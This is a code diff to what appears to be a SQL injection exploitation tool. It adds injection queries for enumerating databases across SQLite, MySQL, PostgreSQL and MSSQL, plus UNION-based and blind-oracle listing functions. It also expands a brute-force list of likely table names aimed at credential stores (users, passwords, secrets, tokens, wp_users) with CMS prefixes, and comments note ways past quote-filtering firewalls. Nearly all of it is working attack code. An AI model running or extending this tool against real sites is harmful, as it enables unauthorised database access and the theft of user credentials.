@@ -53,6 +53,8 @@ _PROFILES = {
         "version":  "sqlite_version()",
         "user":     "''",
         "db":       "'main'",
+        "dbs_n":    "(SELECT count(*) FROM pragma_database_list)",
+        "db_at":    "(SELECT name FROM pragma_database_list LIMIT 1 OFFSET {k})",
         "tables_n": "(SELECT count(*) FROM sqlite_master WHERE type='table')",
         "table_at": "(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {k})",
         "cols_n":   "(SELECT count(*) FROM pragma_table_info('{t}'))",
@@ -66,6 +68,8 @@ _PROFILES = {
         "version":  "@@version",
         "user":     "current_user()",
         "db":       "database()",
+        "dbs_n":    "(SELECT count(*) FROM information_schema.schemata)",
+        "db_at":    "(SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {k})",
         "tables_n": "(SELECT count(*) FROM information_schema.tables WHERE table_schema=database())",
         "table_at": "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {k})",
         "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}' AND table_schema=database())",
@@ -79,6 +83,8 @@ _PROFILES = {
         "version":  "version()",
         "user":     "current_user",
         "db":       "current_database()",
+        "dbs_n":    "(SELECT count(*) FROM pg_database)",
+        "db_at":    "(SELECT datname FROM pg_database LIMIT 1 OFFSET {k})",
         "tables_n": "(SELECT count(*) FROM information_schema.tables WHERE table_schema='public')",
         "table_at": "(SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {k})",
         "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}')",
@@ -92,6 +98,8 @@ _PROFILES = {
         "version":  "@@version",
         "user":     "system_user",
         "db":       "db_name()",
+        "dbs_n":    "(SELECT count(*) FROM sys.databases)",
+        "db_at":    "(SELECT name FROM sys.databases ORDER BY name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
         "tables_n": "(SELECT count(*) FROM information_schema.tables)",
         "table_at": "(SELECT table_name FROM information_schema.tables ORDER BY table_name OFFSET {k} ROWS FETCH NEXT 1 ROWS ONLY)",
         "cols_n":   "(SELECT count(*) FROM information_schema.columns WHERE table_name='{t}')",
@@ -298,14 +306,52 @@ def _list(oracle, prof, count_expr, at_tmpl, **fmt):
 # probing existence by name — `SELECT count(*) FROM <t>` errors (reads False) if
 # the table isn't there, succeeds (True) if it is. No information_schema needed.
 _COMMON_TABLES = [
-    "users", "user", "admin", "admins", "administrator", "accounts", "account",
-    "members", "member", "customers", "customer", "clients", "people", "persons",
-    "staff", "employees", "login", "logins", "credentials", "auth", "authentication",
-    "profiles", "profile", "sessions", "session", "settings", "config", "configuration",
-    "news", "articles", "article", "posts", "post", "pages", "page", "comments",
-    "products", "product", "orders", "order", "items", "categories", "category",
-    "messages", "message", "logs", "log", "events", "tokens", "keys", "secrets",
+    "users", "user", "admin", "admins", "administrator", "administrators", "accounts",
+    "account", "members", "member", "membership", "customers", "customer", "clients",
+    "client", "people", "persons", "person", "staff", "employees", "employee",
+    "login", "logins", "credentials", "credential", "auth", "authentication",
+    "profiles", "profile", "sessions", "session", "settings", "setting", "config",
+    "configs", "configuration", "options", "preferences", "news", "articles", "article",
+    "posts", "post", "blog", "blogs", "pages", "page", "comments", "comment",
+    "products", "product", "orders", "order", "items", "item", "categories", "category",
+    "messages", "message", "inbox", "mail", "emails", "logs", "log", "events", "event",
+    "tokens", "token", "keys", "secrets", "secret", "passwords", "password", "roles",
+    "role", "permissions", "groups", "group", "usergroups", "files", "uploads",
+    "media", "images", "documents", "transactions", "payments", "invoices", "cart",
+    "carts", "wishlist", "reviews", "ratings", "tags", "data", "info", "details",
+    "wp_users", "wp_options", "phpbb_users", "jos_users", "vault",
 ]
+# String literals (db name, table guesses) go in via _strlit on the union path; on
+# the blind path the count(*) probe carries no quotes either, so a quote-filtering
+# WAF doesn't break name-guessing.
+_TABLE_PREFIXES = ["wp_", "phpbb_", "jos_", "joomla_", "drupal_", "tbl_", "tb_", "t_",
+                   "app_", "web_", "sys_", "dbo_"]
+_PREFIXABLE = ["users", "user", "admin", "accounts", "members", "options", "config",
+               "sessions", "posts", "customers", "login", "settings"]
+
+
+def _candidate_tables(db=None):
+    """The name-guessing order: plain common names first (most likely), then the
+    same names prefixed with the database name (`<db>_users` — shared-hosting and
+    prefixed-schema convention), then common CMS/app table prefixes. De-duplicated,
+    likeliest first, so a hit comes early and the request count stays bounded."""
+    out, seen = [], set()
+
+    def add(n):
+        if n and n not in seen:
+            seen.add(n)
+            out.append(n)
+
+    for n in _COMMON_TABLES:
+        add(n)
+    if db:
+        add(db)
+        for n in _PREFIXABLE:
+            add(f"{db}_{n}")
+    for pre in _TABLE_PREFIXES:
+        for n in _PREFIXABLE:
+            add(f"{pre}{n}")
+    return out
 _COMMON_COLUMNS = [
     "id", "user", "username", "user_name", "name", "login", "email", "mail",
     "pass", "passwd", "password", "pwd", "hash", "secret", "token", "role",
@@ -319,10 +365,11 @@ def _exists(oracle, expr) -> bool:
     return oracle.ask(f"({expr})>=0")
 
 
-def common_tables(oracle, names=None):
-    """Yield the table names (from a common-name list) that actually exist —
-    a name-guessing path for when information_schema is filtered."""
-    for t in (names or _COMMON_TABLES):
+def common_tables(oracle, names=None, db=None):
+    """Yield the table names that actually exist — a name-guessing path for when
+    information_schema is filtered. With `db` known, also tries `<db>_<name>` and
+    common CMS/app prefixes (see _candidate_tables)."""
+    for t in (names or _candidate_tables(db)):
         if _exists(oracle, f"SELECT count(*) FROM {t}"):
             yield t
 
@@ -332,6 +379,10 @@ def common_columns(oracle, table, names=None):
     for col in (names or _COMMON_COLUMNS):
         if _exists(oracle, f"SELECT count({col}) FROM {table}"):
             yield col
+
+
+def databases(oracle, prof):
+    return _list(oracle, prof, prof["dbs_n"], prof["db_at"])
 
 
 def tables(oracle, prof):
@@ -361,13 +412,17 @@ _UCOLSEP = "~c0l~"
 
 # Catalog sources per DBMS: "<column> FROM <rest>".
 _UFROM = {
-    "sqlite":   {"tables": "name FROM sqlite_master WHERE type='table'",
+    "sqlite":   {"dbs":    "name FROM pragma_database_list",
+                 "tables": "name FROM sqlite_master WHERE type='table'",
                  "cols":   "name FROM pragma_table_info({t})"},
-    "mysql":    {"tables": "table_name FROM information_schema.tables WHERE table_schema=database()",
+    "mysql":    {"dbs":    "schema_name FROM information_schema.schemata",
+                 "tables": "table_name FROM information_schema.tables WHERE table_schema=database()",
                  "cols":   "column_name FROM information_schema.columns WHERE table_name={t} AND table_schema=database()"},
-    "postgres": {"tables": "table_name FROM information_schema.tables WHERE table_schema='public'",
+    "postgres": {"dbs":    "datname FROM pg_database",
+                 "tables": "table_name FROM information_schema.tables WHERE table_schema='public'",
                  "cols":   "column_name FROM information_schema.columns WHERE table_name={t}"},
-    "mssql":    {"tables": "table_name FROM information_schema.tables",
+    "mssql":    {"dbs":    "name FROM sys.databases",
+                 "tables": "table_name FROM information_schema.tables",
                  "cols":   "column_name FROM information_schema.columns WHERE table_name={t}"},
 }
 
@@ -452,6 +507,10 @@ def _union_list(http, oracle, dbms, ncols, refcol, which, **fmt):
     col, _, frm = _UFROM[dbms][which].format(**fmt).partition(" FROM ")
     data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, col)} FROM {frm}")
     return [x for x in data.split(_UROWSEP) if x]
+
+
+def union_databases(http, oracle, dbms, ncols, refcol):
+    return _union_list(http, oracle, dbms, ncols, refcol, "dbs")
 
 
 def union_tables(http, oracle, dbms, ncols, refcol):
